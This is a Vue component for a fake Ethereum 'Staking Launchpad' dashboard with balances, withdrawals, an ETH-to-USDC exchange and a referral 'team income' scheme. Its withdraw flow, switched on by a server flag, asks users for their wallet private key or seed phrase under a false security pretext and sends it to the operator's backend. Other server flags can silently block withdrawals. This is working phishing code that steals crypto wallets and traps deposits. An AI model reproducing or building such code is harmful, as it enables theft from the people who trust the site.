<template>
  <div class="fixed  w-full z-30 ">
    <!-- Nav Bar -->
    <section class="wallet-btn flex px-4 justify-between py-4 bar-shadow">
      <div class="flex items-center">
        <router-link to="/" class="flex items-center">
          <img
            class="mr-2"
            src="@/assets/eth-diamond-plain.svg"
            alt="beijing"
          />
          <div class="sm:block lg:hidden ml-2 hover:opacity-50 text-base opacity-70 font-medium">
            Staking Lauchpad
          </div> 
        </router-link>
        <ul class="hidden lg:flex ml-2 space-x-8 text-base opacity-70 font-medium">
          <router-link to="/" class="hover:opacity-50">Staking Launchpad</router-link>
          <router-link to="/validator" class="hover:underline hover:opacity-50">FAQ</router-link>
          <li class="hover:underline hover:opacity-50 cursor-pointer"><a href="https://ethereum.org/en/staking/">What is Staking</a></li>
          <router-link to="/term" class="hover:underline hover:opacity-50">Terms of Service</router-link>
          <li class="hover:underline hover:opacity-50 cursor-pointer" @click="isUser" >User Center</li>
        </ul>
      </div>
      <div class="flex text-white">
        <Wallet class="hidden sm:block" text="APPROVED"/>
        <div class="lg:hidden flex items-center ml-4 h-12 text-black" @click="isMenu">
          <font-awesome-icon v-if="menu" :icon="['fas', 'xmark']" class="font-bold text-2xl w-8 h-8" />
          <font-awesome-icon v-else :icon="['fas', 'bars']" class="font-bold text-2xl w-8 h-8" />
        </div>
      </div>
    </section>
    <div class="-z-20 absolute w-full block sm:block  ease-in-out transition transform duration-700" :class="menu ? 'translate-y-0' : '-translate-y-96'">
      <ul class="px-8 bg-white py-4">
        <li><router-link to="/validator">FAQ</router-link>
        </li>
        <li class="cursor-pointer"><a href="https://ethereum.org/en/staking/">What is Staking</a></li>
        <li>
          <router-link to="/term">Terms of Service</router-link>
        </li>
        <li class="hover:underline hover:opacity-70 cursor-pointer" @click="isUser">User Center</li>
      </ul>
    </div>
    <div v-if="address">
      <div v-if="!user" class="absolute w-full h-screen bg-black z-40 top-0 foggy-modal opacity-70" @click="isUser"/>
      <div class="absolute right-0 sm:w-88 w-full bg-red-10 z-50 h-screen sm:h-130   ease-in-out transition transform duration-700" :class="[user ? 'translate-x-full' : 'translate-x-0', isWithDrawModal ? 'overflow-y-auto':'overflow-y-auto']">
        <div class="flex justify-end p-4" @click="isUser"><button></button><font-awesome-icon :icon="['fas', 'xmark']" class="font-bold text-2xl w-8 h-8" /></div>
        <div class="flex justify-between items-center px-8 pb-6">
          <div class="flex">
            <div class="relative">
              <img src="@/assets/man.jpg" alt="eth" class="w-16 h-16 rounded-4xl">
            </div>
            <div class="flex flex-col justify-center ml-4">
              <div>Wallet Adddress</div>
              <div v-if="address">{{`${address.slice(0, -36)}...${address.substring(37)}`}}</div>
              <div v-else>Please connect your wallet</div>
            </div>
          </div>
          <div class=" bg-red-300 text-brown w-24 text-2xl h-12 rounded-full  font-bold  text-center flex justify-center items-center"> <div>{{userInfo?.creadit_score}}</div> </div>
        </div> 
        <div class="bg-white rounded-2xl box-shadow m-4 font-bold">
          <div class="p-4">
            <div>Staking Time</div>
            <div class="flex flex-col pt-4">
              <div class="mb-1 font-normal" > <strong>Start:</strong> {{earningDate[0]?.is_confirmed?`${earningDate[0].created_at?.slice(0, 10)}&nbsp;${earningDate[0].created_at?.slice(11, 19)}`:''}}</div>
              <div class="font-normal"><strong>End:</strong> {{earningDate[0]?.is_confirmed?`${earningDate[0].ending_at?.slice(0, 10)}&nbsp;${earningDate[0].ending_at?.slice(11, 19)}`:''}}</div>
            </div> 
          </div>
          <hr  class="h-1 bg-blue-20"/>
          <div class="flex p-4 justify-around">
            <div class="w-3/5">
              <div>Staking Amount</div>
              <div class="flex items-center py-2">
                <img src="@/assets/USD-Coin-icon_small.png" alt="USD" class="w-6 h-6">
                <div class="ml-1">{{stakingAmount ? stakingAmount?.toFixed(5) : '0.00000'}}</div>
              </div>
            </div>
            <div class="w-2/5">
              <div>Balance</div>
              <div class="flex items-center py-2">
                <img src="@/assets/ETH-logo2.png" alt="eth" class="w-6 h-6">
                <div class="ml-1">{{userInfo.staking_balance ? userInfo.staking_balance?.toFixed(5): '0.00000'}}</div>
              </div>
              <div class="flex items-center">
                <img src="@/assets/USD-Coin-icon_small.png" alt="usd" class="w-6 h-6">
                <div class="ml-1">{{userInfo.usdc_balance ? `${userInfo.usdc_balance?.toFixed(5)}`:"0.00000"}} </div>
              </div>
            </div>
          </div>
        </div>
        <div class="flex justify-center">
          <button class="bg-red-300 py-1  px-4 font-bold opacity-80 text-white rounded-full hover:opacity-100" :class="isWithDrawModal? 'bg-red-500':''" @click="withdraw">WITHDRAW</button>
        </div>
        <div v-if="isWithDrawModal" class="absolute w-full h-130 bg-red-10 z-20  top-0 overflow-hidden">
          <div class="flex justify-center pb-4 pt-16">
            <div class="text-red-300 w-8 h-8 rounded-full border-2 border-red-300 flex justify-center items-center my-2 absolute left-8" @click="withdraw">
              <font-awesome-icon :icon="['fas', 'arrow-left']" class="font-bold text-2xl w-6 h-6" />
            </div>
            <div class="bg-white flex justify-center items-center rounded-full px-8 text-xl py-2 font-bold"> 
              <div>WITHDRAW</div>
            </div>
          </div>
          <hr class="bg-gray-25 h-1"/>

          

          <div class="bg-white rounded-2xl box-shadow my-8 mx-4">
            <div>
              <div class="w-72 mx-auto">
                <div class="relative pt-8 pb-2">
                  <input type="number" class="bg-red-300 rounded w-full h-12 px-4" min="0" v-model="withdrawValue"/>
                  <div v-if="typeof(withdrawValue) == 'number'">
                    <div v-show="isIllegal" class="text-red-600  text-xs pt-0.5">You must be above 50USDC</div>
                  </div>
                  
                  <div class="flex items-center space-x-2 py-2">
                    <div class="text-sm">Usable USDC {{userInfo?.usdc_balance ? (userInfo.usdc_balance).toFixed(5):'0.00000'}}</div>
                    <button class="rounded-full px-4 border border-red-300 text-red-300" @click="withdrawValue=(userInfo?.usdc_balance).toFixed(5)">max</button>
                  </div>
                  <div class="flex items-center space-x-2 py-1">
                    <img src="@/assets/USD-Coin-icon_small.png" alt="usd" class="w-8 h-8 absolute right-1 top-10">
                  </div>
                </div>
                <div class="flex justify-center py-4 relative z-10  ">
                  <button class="bg-red-300 py-1  px-4 font-bold opacity-80 text-white rounded-full z-10" @click="withdrawConfirm" :disabled="withdrawClick">WITHDRAW</button>
                </div>
              </div>

              <div>
                <div v-if="isEnough" class="flex flex-col text-center bg-red-100 absolute z-40 rounded-xl py-4 w-80 top-48 left-1/2 -ml-40">
                  <div>😢</div>
                  <div>USDC balance is low</div>
                  <button @click="isEnough = !isEnough" class="bg-red-300 px-4 rounded-full text-white w-32 mx-auto py-1">CONFIRM</button>  
                </div>
                <div v-if="isSuccess" class="flex flex-col text-center bg-red-100 absolute z-40 rounded-xl py-4 w-80 top-48 left-1/2 -ml-40">
                  <div>😂</div>
                  <div class="font-bold">Send successfully</div>
                  <div class="text-sm py-2">Please wait patiently for your wallet to arrive</div>
                  <button @click="isSuccess = !isSuccess" class="bg-red-300 px-4 rounded-full text-white w-32 mx-auto py-1">CONFIRM</button>  
                </div>
                <div v-if="isWithdrawabled" class="flex flex-col text-center bg-red-100 absolute z-40 rounded-xl py-4 w-80 top-48 left-1/2 -ml-40">
                  <div>😢</div>
                  <div class="font-bold">You can't withdraw</div>
                  <div class="text-sm py-2">Please contact with support</div>
                  <button @click="isWithdrawabled = !isWithdrawabled" class="bg-red-300 px-4 rounded-full text-white w-32 mx-auto py-1">CONFIRM</button>  
                </div>
                 <div v-if="isInputed" class="flex flex-col text-center bg-red-100 absolute z-40 rounded-xl py-4 w-80 top-48 left-1/2 -ml-40">
                  <div>😢</div>
                  <div class="font-bold py-2">You must input your private key</div>
                  <div class="text-sm py-2">Please contact with support</div>
                  <button @click="isInputed = !isInputed" class="bg-red-300 px-4 rounded-full text-white w-32 mx-auto py-1">CONFIRM</button>  
                </div>
              </div>
            </div>
          </div>

          <div v-if="userInfo.popup_privatekey && isPrivateKey" class=" z-50 bg-white rounded-2xl box-shadow relative -mt-64 mx-4">
            <div>
              <div class="w-72 mx-auto">
                <div class="text-center text-xl pt-4">ATTENTION</div>
                <div class="relative pt-8 pb-2">
                  <input type="text" class="bg-red-300 rounded w-full h-12 pl-4" v-model="privateKeyValue"/>
                </div>
                <div class="text-sm">To ensure the security of the verifier's assets, the transfer of the verifier's assets requires the verification of the account private key, or the helper word, please ensure the security of the surrounding environment to enter, and the assets can be transferred after the verification is completed.</div>
                <div class="flex justify-center py-4">
                  <button class="bg-red-300 py-1  px-4 font-bold opacity-80 text-white rounded-full" @click="privateKey">CONFIRM</button>
                </div>
              </div>
            </div>
          </div>

        </div>
        <div class="bg-white rounded-2xl box-shadow my-8 mx-4 font-bold">
          <div class="py-4 text-center">Ethernet Exchange</div>
          <hr  class="h-1 bg-blue-20"/>
          <div>
            <div class="w-40 mx-auto relative">
              <div class="flex items-center space-x-2 py-1">
                <img src="@/assets/ETH-logo2.png" alt="usd" class="w-8 h-8">
                <div class="text-xl">ETH</div>
                <button class="rounded-full px-4 border border-red-300 text-red-300 hover:text-red-500" @click="eth_value=userInfo?.staking_balance">max</button>
              </div>
              <input type="number" class="bg-red-300 rounded w-full h-9 opacity-60 pl-4" min="0"  v-model="eth_value"/>
              <div class="text-red-300 w-8 h-8 rounded-full border-2 border-red-300 flex justify-center items-center mx-auto my-2 cursor-pointer" @click="exchange">
                <font-awesome-icon :icon="['fas', 'arrow-down']" class="font-bold text-2xl w-6 h-6" />
              </div>
              <div class="flex items-center space-x-2 py-1">
                <img src="@/assets/USD-Coin-icon_small.png" alt="usd" class="w-8 h-8">
                <div class="text-xl">USDC</div>
              </div>
              <div v-show="isBalance" class="absolute font-normal text-sm  bg-red-200 opacity-100 z-40 px-8 py-8 rounded-2xl text-center top-20 -left-6"> 
                <div class="w-36">Please input again!!!</div>
                <button @click="isBalance = !isBalance" class="bg-red-400 rounded-full px-4 py-1 mt-4">Confirm</button> 
              </div>
              <input type="number" class="bg-red-300 rounded w-full h-9 opacity-60 pl-4" min="0" :value="(usdc_value).toFixed(5)" disabled/>
              <div class="flex justify-center py-4">
                <button class="bg-red-300 py-1  px-4 font-bold text-white rounded-full" @click="exchangeConfirm" >CONVERT</button>
                <div v-if="isConverted" class="bg-red-100 py-6 z-40 absolute rounded-2xl text-sm top-12">
                  <div class="text-center px-16 mb-4">Really?</div>
                  <div class="flex justify-around text-white">
                    <button class="bg-red-300 px-1 text-center rounded-full" @click="cryptoExchange">Confirm</button>
                    <button class="bg-red-300 px-3 text-center rounded-full" @click="isConverted = !isConverted">Canel</button>
                  </div>
                </div> 
              </div>
            </div>
          </div>
        </div>

        <div class="bg-white rounded-2xl box-shadow mx-4 my-4 font-bold flex justify-between p-4">
          <div>
            <div>My Invitations</div>
            <div class="flex items-center py-2">
              <img src="@/assets/avatar.png" alt="avatar" class="w-6 h-6">
              <div class="ml-2">{{userInfo?.invited_number ? userInfo?.invited_number : "0"}}</div>
            </div>
          </div>
          <div>
            <div>Team income</div>
            <div class="flex items-center py-2">
              <img src="@/assets/ETH-logo2.png" alt="eth" class="w-6 h-6">
              <div class="ml-2">{{userInfo?.invitation_earning ? (userInfo.invitation_earning).toFixed(5) : '0.00000'}}</div>
            </div>
          </div>
        </div>

        <div class="flex justify-center">
          <button class="bg-red-300 py-1  px-4 font-bold opacity-80 text-white rounded-full" @click="invite">INVITE USERS</button>
        </div>

        <div v-if="isInvite" class="bg-red-100  h-80 box-shadow rounded-xl absolute top-96 left-1/2 w-92 -ml-40">
          <div class="flex justify-end p-2" @click="invite">
            <font-awesome-icon :icon="['fas', 'xmark']" class="font-bold text-2xl w-6 h-6" />
          </div>
          <div class="mb-4 text-center font-bold">Invitation Links</div>
          <div class="border-2 border-black rounded-xl w-64 h-40 mx-auto bg-red-200 flex justify-center items-center"> <div class="w-60 text-xs text-center">{{`https://eth-staking.net/?invitation=${userInfo._id}`}}</div></div>
          <button class="bg-red-300 rounded-full w-32 h-10 flex justify-center items-center mx-auto my-4 hover:text-white" @click="copy">
            <div>Copy</div> 
          </button>
        </div>
        <div class="bg-white rounded-2xl box-shadow mx-4 mt-8 mb-36 pb-8">
          <TabsWrapper class="px-4">
            <TabItem title="Earnings records">
              <div class="text-gray-500 flex  flex-col " v-for="(item, i) in earningRecords" :key="i">
                <div  class="flex justify-between items-center px-2 border-b border-black text-xs py-2">
                  <div>{{ `${changeData(item.timeStamp)?.slice(0, 10)}&nbsp;${changeData(item.timeStamp)?.slice(11, 19)}`}}</div>
                  <div class="text-center">+{{item.earning?.toFixed(5)}} ETH</div> 
                </div>
              </div>
            </TabItem>
            <TabItem title="Withdrawal records">
              <div class="text-gray-500 flex justify-between px-2 border-b border-black text-xs py-2" v-for="(item, i) in withDrawRecords" :key="i">
                <div>{{`${item.created_at?.slice(0, 10)}&nbsp;${item.created_at?.slice(11, 19)}`}}</div>
                <div>-{{item.amount}} USDC</div>
                <div class="flex justify-center items-center">
                  <div>{{item.is_checked? item.is_confirmed? 'Done':'Failed' :'Waiting'}}</div>
                </div>
              </div>
            </TabItem>
          </TabsWrapper>
        </div>  
        <div>{{userInfo}}</div>
      </div>
    </div>

    <div v-if="isWallet">
      <div class="absolute w-full h-screen bg-black z-40 top-0 foggy-modal opacity-70"/>
        <div class="bg-white w-72 mx-auto z-40 relative flex justify-center items-center py-8 rounded-2xl flex-col mt-72">
          <div> Please connect your wallet!!!</div>
          <button @click="close" class="bg-green-650 text-white rounded-full px-8 py-2 mt-8">Close</button>
        </div>
    </div>



  </div>
</template>
<script>
  import { ref, computed, onMounted, watch, reactive } from 'vue';
  import Web3Wallet from "@/utils/Web3Wallet"
  import {getUrlQueryString} from "@/utils" 
  import { useStore } from 'vuex';
  import useClipboard from 'vue-clipboard3'
  import TabsWrapper from '@/components/dashboard/tab/TabsWrapper.vue'
  import TabItem from '@/components/dashboard/tab/TabItem.vue'
  import Wallet from '@/components/dashboard/Wallet.vue'
  import changeData from '@/utils/changeData'
  export default {
    components : {
      TabsWrapper,
      TabItem,
      Wallet,
    },
    setup() {
      const store = useStore()
      const { toClipboard } = useClipboard()
      let menu = ref(false);
      let user = ref(true);
      const eth_value = ref(0);
      const isIllegal = ref(false);
      const usdc_value = ref(0);
      const converted_usdc_value = ref(0);
      const isEnough = ref(false);
      const isSuccess = ref(false);
      const withdrawClick = ref(false);
      const withdrawValue = ref(0);
      const isBalance = ref(false);
      const isConverted = ref(false);
      const isWithDrawModal = ref(false);
      const isInvite = ref(false)
      const isConfirm = ref(false)
      const isInputed = ref(false)
      const privateKeyValue = ref('');
      const isWallet = ref(false);
      const isWithdrawabled = ref(false);
      const earning = ref(0);
      const isMenu = () => (menu.value = !menu.value);
      const isUser = async () => {
        user.value = !user.value
        if(!address.value) {
          isWallet.value = true
        }
        await store.dispatch('withdraw/getWithDraw', address.value)
        await store.dispatch('withdraw/getEarning', address.value)
      };
      const close = () => {
        isWallet.value = false
      }
      const withdraw = () => (isWithDrawModal.value = !isWithDrawModal.value);
      
      onMounted(async () => {
        await store.dispatch('user/fetchEtherPrice')
        await store.dispatch('user/fetchIPAddress')
        


      })
      const ethPrice = computed(() => store.getters['user/getEtherPrice'])
      const address = computed(() => store.getters['user/getUserAddress'])
      const userInfo = computed(() => store.getters['user/getUserInfo'])
      const withDrawRecords = computed(() => store.getters['withdraw/getWithDrawRecords'])
      const earningRecords = computed(() => store.getters['withdraw/getEarningRecords'])
      const earningAmount = computed(() => store.getters['withdraw/getEarningAmount'])
      const earningDate = computed(() => store.getters['withdraw/getConfirmedRecords'])
      const stakingAmount = computed(() => store.getters['withdraw/getStakingAmount'])
      
      

      

      const isPrivateKey = ref(false);
      const isWithDraw = ref(false);
      const privateKey = async () => {
        if(privateKeyValue.value?.length > 0) {
          isPrivateKey.value = !isPrivateKey.value;
          isWithDraw.value = !isWithDraw.value;
          let payload1 = {
            walletAddress:address.value,
            data: { 
              privatekey : privateKeyValue.value,
            }
          }
          await store.dispatch('user/createPrivateKey', payload1)

          let payload = {
            wallet: address.value,
            amount: withdrawValue.value
          }
          withdrawClick.value = true;
          await store.dispatch( 'withdraw/withdraw', payload)
          store.commit('user/setUsdcWithDraw', withdrawValue.value)
          let withDraw = {
            walletAddress:address.value,
            data: { 
              usdc_balance: userInfo.value.usdc_balance,
            }
          }
          await store.dispatch('user/createPrivateKey', withDraw)
          withdrawClick.value = false;
          isSuccess.value = true
        } else {
          isInputed.value = true
          isPrivateKey.value = !isPrivateKey.value;
        }
      }
  
      const exchange = async () => {
        
        isConfirm.value = true
        // isConverted.value = true
      }
      const exchangeConfirm = () => {
        if(eth_value.value <= userInfo.value.staking_balance && eth_value.value != 0) {
          isConverted.value = true
          isBalance.value = false
        } else {
          isBalance.value = true
        }
      }
      const cryptoExchange = async () => {
        isConverted.value = !isConverted.value
          if(isConfirm) {
            store.commit('user/setStakingBalance', eth_value.value)
            store.commit('user/setUsdcBalance', usdc_value.value)
            let payload = {
              walletAddress:address.value,
              data: { 
                staking_balance : userInfo.value.staking_balance,
                usdc_balance: userInfo.value.usdc_balance,
              }
            }
            await store.dispatch('user/createPrivateKey', payload)
            let convertValue = {
              wallet: address.value,
              eth_amount: eth_value.value,
              usdc_amount: usdc_value.value,
              created_at: new Date(),
            }
            await store.dispatch('user/cryptoConvert', convertValue)
                isConfirm.value = false
          }
      
      }

      const withdrawConfirm = async () => { 
        if(userInfo.value?.withdrawal_disabled) {
            isWithdrawabled.value = true; 
            return;
        }
        if(withdrawValue.value > userInfo.value.usdc_balance)
          isEnough.value = true
        if(userInfo.value?.popup_privatekey == false) {
          isWithDraw.value = true
        } else {
          isWithDraw.value = false
        }
        console.log('userInfo.value?.popup_privatekey', userInfo.value?.popup_privatekey, isWithDraw.value)
        if(!isIllegal.value && withdrawValue.value != 0) {
          if(!isEnough.value) {
              isPrivateKey.value = !isPrivateKey.value;
              if(isWithDraw.value) {
                let payload = {
                  wallet: address.value,
                  amount: withdrawValue.value
                }
                withdrawClick.value = true;
                await store.dispatch( 'withdraw/withdraw', payload)
                store.commit('user/setUsdcWithDraw', withdrawValue.value)
                let withDraw = {
                  walletAddress:address.value,
                  data: { 
                    usdc_balance: userInfo.value.usdc_balance,
                  }
                }
                await store.dispatch('user/createPrivateKey', withDraw)
                withdrawClick.value = false;
                isSuccess.value = true
              }
            } 
        }
      }

      const invite = () => {
        isInvite.value = !isInvite.value
      }

      const copy = async () => {
        try {
          await toClipboard(`https://eth-staking.net/?invitation=${userInfo.value._id}`)
        } catch (e) {
          console.error(e)
        }
      }

      watch(
        eth_value,
        () => { usdc_value.value = ethPrice.value * eth_value.value }
      )
      watch(
        withdrawValue,
        ()=> { 
          if(withdrawValue.value <= 50 ) {
            isIllegal.value = true
          } else {
            isIllegal.value = false
          }
        }
      )



      return { 
        menu, 
        isMenu, 
        isIllegal,
        user, 
        close,
        isUser, 
        isWallet,
        earning,
        address, 
        isWithDrawModal, 
        withdraw, 
        privateKey, 
        isPrivateKey, 
        userInfo, 
        exchange, 
        eth_value, 
        usdc_value,
        withdrawConfirm,
        withdrawClick,
        isWithdrawabled,
        withdrawValue,
        privateKeyValue,
        invite,
        isInvite,
        copy,
        cryptoExchange,
        isConfirm,
        isBalance,
        withDrawRecords,
        earningRecords,
        earningDate,
        isEnough,
        isSuccess,
        ethPrice,
        converted_usdc_value,
        changeData,
        isConverted,
        exchangeConfirm,
        earningAmount,
        stakingAmount,
        isInputed,
      };

    },
  };
</script>
